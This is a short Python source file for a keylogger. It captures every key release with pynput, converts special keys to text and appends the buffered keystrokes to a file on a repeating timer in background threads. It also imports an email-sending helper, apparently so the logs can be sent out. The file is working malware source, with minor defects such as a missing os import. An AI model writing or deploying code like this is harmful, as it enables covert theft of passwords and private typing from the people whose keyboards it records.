#!/bin/python3.8

import threading
import pynput.keyboard as Keyboard

from send_email_using_python import Send_Email
from threading import Timer, Thread, Event

class Key(object):

    def __init__(self, file_name, interval=5):
        self.interval = interval
        self.file_name = file_name
        self.log =""


    def report_to_file(self):
        with open(self.file_name, "a+") as f:
            f.write(self.log)

    def report(self):
        if len(self.log) > 0:
            self.report_to_file()
            self.log = ""

        timer = Timer(interval=self.interval, function=self.report)
        timer.daemon = True
        timer.start()


    def delete_file(self):
        os.remove(self.file_name)

    def on_release(self, key):
            if key == Keyboard.Key.esc:
                self.delete_file()
                return False
            self.callback(key)

    def callback(self, key_input):
        key_input = str(key_input)
        if len(str(key_input)) > 0:
            if key_input == "Key.space":
                key_input = " "
            elif key_input =="Key.enter":
                key_input = "ENTER\n"
            elif key_input == "Key.decimal":
                key_input = "."
            elif key_input == "Key.ctrl":
                key_input = "CONTROL\n"
            elif key_input == "Key.tab":
                key_input = "TAB\n"
            elif key_input == "  ":
                key_input = "_"
        key_input = key_input.replace("'", "")
        self.log += key_input

    def start(self):
        with Keyboard.Listener(on_release=self.on_release) as listener:
            listener.join()

    def some_f(self, f):
        a = threading.Thread(target=self.start, name='A')
        b = threading.Thread(target=self.report, name='B', daemon=True)
        c = threading.Thread(target=f.report, name='C', daemon=True)
        a.start()
        b.start()
        c.start()
